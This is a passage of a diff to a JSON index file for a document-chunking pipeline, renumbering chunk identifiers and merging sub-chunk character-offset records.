-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_source_id": "ver_b497005071ae_c00029_s002",
+      "chunk_id": "ver_b497005071ae_c00029",
       "normalized_block_id": "nrm_ver_b497005071ae_b00046",
       "source_order": 2,
       "start_offset": 385,
       "end_offset": 502
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00020_s003",
-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_source_id": "ver_b497005071ae_c00029_s003",
+      "chunk_id": "ver_b497005071ae_c00029",
       "normalized_block_id": "nrm_ver_b497005071ae_b00046",
       "source_order": 3,
       "start_offset": 503,
       "end_offset": 561
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00020_s004",
-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_source_id": "ver_b497005071ae_c00029_s004",
+      "chunk_id": "ver_b497005071ae_c00029",
       "normalized_block_id": "nrm_ver_b497005071ae_b00047",
       "source_order": 4,
       "start_offset": 0,
       "end_offset": 66
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00020_s005",
-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_source_id": "ver_b497005071ae_c00029_s005",
+      "chunk_id": "ver_b497005071ae_c00029",
       "normalized_block_id": "nrm_ver_b497005071ae_b00048",
       "source_order": 5,
       "start_offset": 0,
       "end_offset": 112
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00020_s006",
-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_source_id": "ver_b497005071ae_c00029_s006",
+      "chunk_id": "ver_b497005071ae_c00029",
       "normalized_block_id": "nrm_ver_b497005071ae_b00048",
       "source_order": 6,
       "start_offset": 113,
       "end_offset": 130
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00020_s007",
-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_source_id": "ver_b497005071ae_c00029_s007",
+      "chunk_id": "ver_b497005071ae_c00029",
       "normalized_block_id": "nrm_ver_b497005071ae_b00048",
       "source_order": 7,
       "start_offset": 131,
       "end_offset": 178
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00020_s008",
-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_source_id": "ver_b497005071ae_c00029_s008",
+      "chunk_id": "ver_b497005071ae_c00029",
       "normalized_block_id": "nrm_ver_b497005071ae_b00049",
       "source_order": 8,
       "start_offset": 0,
       "end_offset": 255
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00020_s009",
-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_source_id": "ver_b497005071ae_c00029_s009",
+      "chunk_id": "ver_b497005071ae_c00029",
       "normalized_block_id": "nrm_ver_b497005071ae_b00050",
       "source_order": 9,
       "start_offset": 0,
       "end_offset": 115
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00020_s010",
-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_source_id": "ver_b497005071ae_c00029_s010",
+      "chunk_id": "ver_b497005071ae_c00029",
       "normalized_block_id": "nrm_ver_b497005071ae_b00051",
       "source_order": 10,
       "start_offset": 0,
       "end_offset": 333
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00020_s011",
-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_source_id": "ver_b497005071ae_c00029_s011",
+      "chunk_id": "ver_b497005071ae_c00029",
       "normalized_block_id": "nrm_ver_b497005071ae_b00052",
       "source_order": 11,
       "start_offset": 0,
       "end_offset": 30
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00021_s000",
-      "chunk_id": "ver_b497005071ae_c00021",
+      "chunk_source_id": "ver_b497005071ae_c00030_s000",
+      "chunk_id": "ver_b497005071ae_c00030",
       "normalized_block_id": "nrm_ver_b497005071ae_b00053",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 1057
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00021_s001",
-      "chunk_id": "ver_b497005071ae_c00021",
+      "chunk_source_id": "ver_b497005071ae_c00031_s000",
+      "chunk_id": "ver_b497005071ae_c00031",
       "normalized_block_id": "nrm_ver_b497005071ae_b00054",
-      "source_order": 1,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 21
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00021_s002",
-      "chunk_id": "ver_b497005071ae_c00021",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00055",
-      "source_order": 2,
-      "start_offset": 0,
-      "end_offset": 71
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00021_s003",
-      "chunk_id": "ver_b497005071ae_c00021",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00055",
-      "source_order": 3,
-      "start_offset": 73,
-      "end_offset": 104
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00021_s004",
-      "chunk_id": "ver_b497005071ae_c00021",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00055",
-      "source_order": 4,
-      "start_offset": 106,
-      "end_offset": 170
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00021_s005",
-      "chunk_id": "ver_b497005071ae_c00021",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00055",
-      "source_order": 5,
-      "start_offset": 172,
-      "end_offset": 203
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00021_s006",
-      "chunk_id": "ver_b497005071ae_c00021",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00055",
-      "source_order": 6,
-      "start_offset": 205,
-      "end_offset": 268
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00022_s000",
-      "chunk_id": "ver_b497005071ae_c00022",
+      "chunk_source_id": "ver_b497005071ae_c00032_s000",
+      "chunk_id": "ver_b497005071ae_c00032",
       "normalized_block_id": "nrm_ver_b497005071ae_b00055",
       "source_order": 0,
-      "start_offset": 270,
-      "end_offset": 301
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00022_s001",
-      "chunk_id": "ver_b497005071ae_c00022",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00055",
-      "source_order": 1,
-      "start_offset": 303,
-      "end_offset": 367
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00022_s002",
-      "chunk_id": "ver_b497005071ae_c00022",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00055",
-      "source_order": 2,
-      "start_offset": 369,
-      "end_offset": 400
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00022_s003",
-      "chunk_id": "ver_b497005071ae_c00022",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00055",
-      "source_order": 3,
-      "start_offset": 402,
-      "end_offset": 478
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00022_s004",
-      "chunk_id": "ver_b497005071ae_c00022",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00055",
-      "source_order": 4,
-      "start_offset": 480,
+      "start_offset": 0,
       "end_offset": 491
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00022_s005",
-      "chunk_id": "ver_b497005071ae_c00022",
+      "chunk_source_id": "ver_b497005071ae_c00033_s000",
+      "chunk_id": "ver_b497005071ae_c00033",
       "normalized_block_id": "nrm_ver_b497005071ae_b00056",
-      "source_order": 5,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 18
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00022_s006",
-      "chunk_id": "ver_b497005071ae_c00022",
+      "chunk_source_id": "ver_b497005071ae_c00034_s000",
+      "chunk_id": "ver_b497005071ae_c00034",
       "normalized_block_id": "nrm_ver_b497005071ae_b00057",
-      "source_order": 6,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 81
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00022_s007",
-      "chunk_id": "ver_b497005071ae_c00022",
+      "chunk_source_id": "ver_b497005071ae_c00035_s000",
+      "chunk_id": "ver_b497005071ae_c00035",
       "normalized_block_id": "nrm_ver_b497005071ae_b00058",
-      "source_order": 7,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 94
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00022_s008",
-      "chunk_id": "ver_b497005071ae_c00022",
+      "chunk_source_id": "ver_b497005071ae_c00035_s001",
+      "chunk_id": "ver_b497005071ae_c00035",
       "normalized_block_id": "nrm_ver_b497005071ae_b00058",
-      "source_order": 8,
+      "source_order": 1,
       "start_offset": 95,
       "end_offset": 260
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00022_s009",
-      "chunk_id": "ver_b497005071ae_c00022",
+      "chunk_source_id": "ver_b497005071ae_c00035_s002",
+      "chunk_id": "ver_b497005071ae_c00035",
       "normalized_block_id": "nrm_ver_b497005071ae_b00058",
-      "source_order": 9,
+      "source_order": 2,
       "start_offset": 261,
       "end_offset": 337
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00022_s010",
-      "chunk_id": "ver_b497005071ae_c00022",
+      "chunk_source_id": "ver_b497005071ae_c00035_s003",
+      "chunk_id": "ver_b497005071ae_c00035",
       "normalized_block_id": "nrm_ver_b497005071ae_b00059",
-      "source_order": 10,
+      "source_order": 3,
       "start_offset": 0,
       "end_offset": 16
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00022_s011",
-      "chunk_id": "ver_b497005071ae_c00022",
+      "chunk_source_id": "ver_b497005071ae_c00035_s004",
+      "chunk_id": "ver_b497005071ae_c00035",
       "normalized_block_id": "nrm_ver_b497005071ae_b00060",
-      "source_order": 11,
+      "source_order": 4,
       "start_offset": 0,
       "end_offset": 132
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00022_s012",
-      "chunk_id": "ver_b497005071ae_c00022",
+      "chunk_source_id": "ver_b497005071ae_c00035_s005",
+      "chunk_id": "ver_b497005071ae_c00035",
       "normalized_block_id": "nrm_ver_b497005071ae_b00060",
-      "source_order": 12,
+      "source_order": 5,
       "start_offset": 133,
       "end_offset": 245
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00022_s013",
-      "chunk_id": "ver_b497005071ae_c00022",
+      "chunk_source_id": "ver_b497005071ae_c00035_s006",
+      "chunk_id": "ver_b497005071ae_c00035",
       "normalized_block_id": "nrm_ver_b497005071ae_b00060",
-      "source_order": 13,
+      "source_order": 6,
       "start_offset": 246,
       "end_offset": 315
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00022_s014",
-      "chunk_id": "ver_b497005071ae_c00022",
+      "chunk_source_id": "ver_b497005071ae_c00036_s000",
+      "chunk_id": "ver_b497005071ae_c00036",
       "normalized_block_id": "nrm_ver_b497005071ae_b00061",
-      "source_order": 14,
+      "source_order": 0,
       "start_offset": 0,
-      "end_offset": 92
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00022_s015",
-      "chunk_id": "ver_b497005071ae_c00022",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00061",
-      "source_order": 15,
-      "start_offset": 94,
-      "end_offset": 137
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00022_s016",
-      "chunk_id": "ver_b497005071ae_c00022",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00061",
-      "source_order": 16,
-      "start_offset": 139,
-      "end_offset": 176
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00022_s017",
-      "chunk_id": "ver_b497005071ae_c00022",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00061",
-      "source_order": 17,
-      "start_offset": 178,
       "end_offset": 205
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00023_s000",
-      "chunk_id": "ver_b497005071ae_c00023",
+      "chunk_source_id": "ver_b497005071ae_c00037_s000",
+      "chunk_id": "ver_b497005071ae_c00037",
       "normalized_block_id": "nrm_ver_b497005071ae_b00062",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 8
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00024_s000",
-      "chunk_id": "ver_b497005071ae_c00024",
+      "chunk_source_id": "ver_b497005071ae_c00038_s000",
+      "chunk_id": "ver_b497005071ae_c00038",
       "normalized_block_id": "nrm_ver_b497005071ae_b00063",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 239
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00024_s001",
-      "chunk_id": "ver_b497005071ae_c00024",
+      "chunk_source_id": "ver_b497005071ae_c00038_s001",
+      "chunk_id": "ver_b497005071ae_c00038",
       "normalized_block_id": "nrm_ver_b497005071ae_b00063",
       "source_order": 1,
       "start_offset": 240,
       "end_offset": 312
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00024_s002",
-      "chunk_id": "ver_b497005071ae_c00024",
+      "chunk_source_id": "ver_b497005071ae_c00038_s002",
+      "chunk_id": "ver_b497005071ae_c00038",
       "normalized_block_id": "nrm_ver_b497005071ae_b00063",
       "source_order": 2,
       "start_offset": 313,
       "end_offset": 502
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00024_s003",
-      "chunk_id": "ver_b497005071ae_c00024",
+      "chunk_source_id": "ver_b497005071ae_c00038_s003",
+      "chunk_id": "ver_b497005071ae_c00038",
       "normalized_block_id": "nrm_ver_b497005071ae_b00063",
       "source_order": 3,
       "start_offset": 503,
       "end_offset": 568
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00024_s004",
-      "chunk_id": "ver_b497005071ae_c00024",
+      "chunk_source_id": "ver_b497005071ae_c00038_s004",
+      "chunk_id": "ver_b497005071ae_c00038",
       "normalized_block_id": "nrm_ver_b497005071ae_b00063",
       "source_order": 4,
       "start_offset": 569,
       "end_offset": 688
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00024_s005",
-      "chunk_id": "ver_b497005071ae_c00024",
+      "chunk_source_id": "ver_b497005071ae_c00038_s005",
+      "chunk_id": "ver_b497005071ae_c00038",
       "normalized_block_id": "nrm_ver_b497005071ae_b00063",
       "source_order": 5,
       "start_offset": 689,
       "end_offset": 791
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00024_s006",
-      "chunk_id": "ver_b497005071ae_c00024",
+      "chunk_source_id": "ver_b497005071ae_c00038_s006",
+      "chunk_id": "ver_b497005071ae_c00038",
       "normalized_block_id": "nrm_ver_b497005071ae_b00063",
       "source_order": 6,
       "start_offset": 792,
       "end_offset": 831
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00024_s007",
-      "chunk_id": "ver_b497005071ae_c00024",
+      "chunk_source_id": "ver_b497005071ae_c00038_s007",
+      "chunk_id": "ver_b497005071ae_c00038",
       "normalized_block_id": "nrm_ver_b497005071ae_b00063",
       "source_order": 7,
       "start_offset": 832,
       "end_offset": 969
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00024_s008",
-      "chunk_id": "ver_b497005071ae_c00024",
+      "chunk_source_id": "ver_b497005071ae_c00038_s008",
+      "chunk_id": "ver_b497005071ae_c00038",
       "normalized_block_id": "nrm_ver_b497005071ae_b00063",
       "source_order": 8,
       "start_offset": 970,
       "end_offset": 1135
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00025_s000",
-      "chunk_id": "ver_b497005071ae_c00025",
+      "chunk_source_id": "ver_b497005071ae_c00039_s000",
+      "chunk_id": "ver_b497005071ae_c00039",
       "normalized_block_id": "nrm_ver_b497005071ae_b00064",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 7
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s000",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00040_s000",
+      "chunk_id": "ver_b497005071ae_c00040",
       "normalized_block_id": "nrm_ver_b497005071ae_b00065",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 117
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s001",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00040_s001",
+      "chunk_id": "ver_b497005071ae_c00040",
       "normalized_block_id": "nrm_ver_b497005071ae_b00066",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 149
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s002",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00040_s002",
+      "chunk_id": "ver_b497005071ae_c00040",
       "normalized_block_id": "nrm_ver_b497005071ae_b00067",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 141
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s003",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00040_s003",
+      "chunk_id": "ver_b497005071ae_c00040",
       "normalized_block_id": "nrm_ver_b497005071ae_b00068",
       "source_order": 3,
       "start_offset": 0,
       "end_offset": 110
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s004",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00040_s004",
+      "chunk_id": "ver_b497005071ae_c00040",
       "normalized_block_id": "nrm_ver_b497005071ae_b00069",
       "source_order": 4,
       "start_offset": 0,
       "end_offset": 69
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s005",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00041_s000",
+      "chunk_id": "ver_b497005071ae_c00041",
       "normalized_block_id": "nrm_ver_b497005071ae_b00070",
-      "source_order": 5,
+      "source_order": 0,
       "start_offset": 0,
-      "end_offset": 75
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00026_s006",
-      "chunk_id": "ver_b497005071ae_c00026",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00070",
-      "source_order": 6,
-      "start_offset": 76,
       "end_offset": 119
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s007",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00042_s000",
+      "chunk_id": "ver_b497005071ae_c00042",
       "normalized_block_id": "nrm_ver_b497005071ae_b00071",
-      "source_order": 7,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 21
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s008",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00043_s000",
+      "chunk_id": "ver_b497005071ae_c00043",
       "normalized_block_id": "nrm_ver_b497005071ae_b00072",
-      "source_order": 8,
+      "source_order": 0,
       "start_offset": 0,
-      "end_offset": 63
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00026_s009",
-      "chunk_id": "ver_b497005071ae_c00026",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00072",
-      "source_order": 9,
-      "start_offset": 64,
       "end_offset": 101
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s010",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00044_s000",
+      "chunk_id": "ver_b497005071ae_c00044",
       "normalized_block_id": "nrm_ver_b497005071ae_b00073",
-      "source_order": 10,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 228
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s011",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00044_s001",
+      "chunk_id": "ver_b497005071ae_c00044",
       "normalized_block_id": "nrm_ver_b497005071ae_b00074",
-      "source_order": 11,
+      "source_order": 1,
       "start_offset": 0,
       "end_offset": 95
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s012",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00045_s000",
+      "chunk_id": "ver_b497005071ae_c00045",
       "normalized_block_id": "nrm_ver_b497005071ae_b00075",
-      "source_order": 12,
+      "source_order": 0,
       "start_offset": 0,
-      "end_offset": 75
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00026_s013",
-      "chunk_id": "ver_b497005071ae_c00026",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00075",
-      "source_order": 13,
-      "start_offset": 76,
       "end_offset": 119
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s014",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00046_s000",
+      "chunk_id": "ver_b497005071ae_c00046",
       "normalized_block_id": "nrm_ver_b497005071ae_b00076",
-      "source_order": 14,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 32
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s015",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00047_s000",
+      "chunk_id": "ver_b497005071ae_c00047",
       "normalized_block_id": "nrm_ver_b497005071ae_b00077",
-      "source_order": 15,
+      "source_order": 0,
       "start_offset": 0,
-      "end_offset": 61
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00026_s016",
-      "chunk_id": "ver_b497005071ae_c00026",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00077",
-      "source_order": 16,
-      "start_offset": 62,
       "end_offset": 100
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s017",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00048_s000",
+      "chunk_id": "ver_b497005071ae_c00048",
       "normalized_block_id": "nrm_ver_b497005071ae_b00078",
-      "source_order": 17,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 107
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s018",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00048_s001",
+      "chunk_id": "ver_b497005071ae_c00048",
       "normalized_block_id": "nrm_ver_b497005071ae_b00079",
-      "source_order": 18,
+      "source_order": 1,
       "start_offset": 0,
       "end_offset": 74
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00026_s019",
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_source_id": "ver_b497005071ae_c00048_s002",
+      "chunk_id": "ver_b497005071ae_c00048",
       "normalized_block_id": "nrm_ver_b497005071ae_b00080",
-      "source_order": 19,
+      "source_order": 2,
       "start_offset": 0,
       "end_offset": 83
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00027_s000",
-      "chunk_id": "ver_b497005071ae_c00027",
+      "chunk_source_id": "ver_b497005071ae_c00048_s003",
+      "chunk_id": "ver_b497005071ae_c00048",
       "normalized_block_id": "nrm_ver_b497005071ae_b00080",
-      "source_order": 0,
+      "source_order": 3,
       "start_offset": 84,
       "end_offset": 193
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00027_s001",
-      "chunk_id": "ver_b497005071ae_c00027",
+      "chunk_source_id": "ver_b497005071ae_c00048_s004",
+      "chunk_id": "ver_b497005071ae_c00048",
       "normalized_block_id": "nrm_ver_b497005071ae_b00080",
-      "source_order": 1,
+      "source_order": 4,
       "start_offset": 194,
       "end_offset": 341
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00028_s000",
-      "chunk_id": "ver_b497005071ae_c00028",
+      "chunk_source_id": "ver_b497005071ae_c00049_s000",
+      "chunk_id": "ver_b497005071ae_c00049",
       "normalized_block_id": "nrm_ver_b497005071ae_b00081",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 13
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00029_s000",
-      "chunk_id": "ver_b497005071ae_c00029",
+      "chunk_source_id": "ver_b497005071ae_c00050_s000",
+      "chunk_id": "ver_b497005071ae_c00050",
       "normalized_block_id": "nrm_ver_b497005071ae_b00082",
       "source_order": 0,
       "start_offset": 0,
